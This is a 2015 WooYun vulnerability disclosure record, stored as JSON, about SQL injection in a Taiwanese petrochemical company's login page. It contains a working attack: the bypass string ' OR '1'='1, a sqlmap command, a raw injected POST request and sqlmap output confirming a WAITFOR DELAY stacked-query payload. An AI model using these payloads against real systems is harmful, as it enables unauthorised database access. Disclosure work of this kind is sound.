{"id": 77296, "wybug_id": "wooyun-2015-0162845", "wybug_title": "中美和石油化學股份有限公司某管理系统存在注入（臺灣地區）", "wybug_corp": "中美和石油化學股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-21 12:37", "wybug_open_date": "2016-02-04 17:47", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向公众公开  简要描述： 一并解决吧！！！ 详细说明：  http://**.**.**.**/问题出现在登录Login.aspx处，万能密码' OR '1'='1 可绕过。POST型注入，字段txtPASSWORD，dba权限\nsqlmap.py -r 1.txt --dbms=MSSQL -p txtPASSWORD --random-angent\n\nPOST /Login.aspx HTTP/1.1Cache-Control: no-cacheReferer: http://**.**.**.**/Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 NetsparkerAccept-Language: en-us,en;q=0.5X-Scanner: NetsparkerHost: **.**.**.**Cookie: ASP.NET_SessionId=xeo3barzxapk44e2zs0pib45Accept-Encoding: gzip, deflateContent-Length: 563Content-Type: application/x-www-form-urlencoded__EVENTTARGET=3&__EVENTARGUMENT=3&__LASTFOCUS=3&__VIEWSTATE=%2fwEPDwUKMTg5Mjc2MzI4OA9kFgICBA9kFggCAQ8QZGQWAWZkAgMPD2QWAh4Hb25Gb2N1cwUOdGhpcy5zZWxlY3QoKTtkAgUPD2QWAh8ABQ50aGlzLnNlbGVjdCgpO2QCCw9kFgJmDxYEHglhY2Nlc3NLZXlkHgdvbmNsaWNrBQ93aW5kb3cuY2xvc2UoKTtkZCfied6YDsWze46PyWiwNud37lZo&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2fwEWCQLUxsCoBgKOk%2f6oCwLp0r%2bzAQKT0qL0DwL1pt%2fYCwKViPuNBwLj9MDHDQLCgsKRCALah%2bbzAv03XDgbetv08P2oUI%2b%2ffE7MZbX0&radRunSystem=online&txtUSERID=3&txtPASSWORD=%27+OR+%27ns%27%3d%27ns&radLanguage=zh-tw&btnLOGIN=%e7%99%bb%e5%85%a5\n   漏洞证明：  \n\n\n\n\nPOST parameter 'txtPASSWORD' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:---Parameter: txtPASSWORD (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __EVENTTARGET=3&__EVENTARGUMENT=3&__LASTFOCUS=3&__VIEWSTATE=/wEPDwUKMTg5Mjc2MzI4OA9kFgICBA9kFgoCAQ8QZGQWAWZkAgMPD2QWAh4Hb25Gb2N1cwUOdGhpcy5zZWxlY3QoKTtkAgUPD2QWAh8ABQ50aGlzLnNlbGVjdCgpO2QCCw9kFgJmDxYEHglhY2Nlc3NLZXlkHgdvbmNsaWNrBQ93aW5kb3cuY2xvc2UoKTtkAg0PDxYCHgRUZXh0BSros4fmlpnluqvpqZforYkgOiDnmbvlhaXkvb/nlKjogIXkuI3lrZjlnKhkZGRvoTowmxSXyBUHl9vMnrZUKnt7tA==&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=/wEWCQLbj5iACAKOk/6oCwLp0r+zAQKT0qL0DwL1pt/YCwKViPuNBwLj9MDHDQLCgsKRCALah+bzAtLO4467kocBz3WW8/os3r73lC2+&radRunSystem=online&txtUSERID=3&txtPASSWORD=1ns';WAITFOR DELAY '0:0:5'--&radLanguage=zh-tw&btnLOGIN=%e7%99%bb%e5%85%a5---\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-12-23 04:18 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}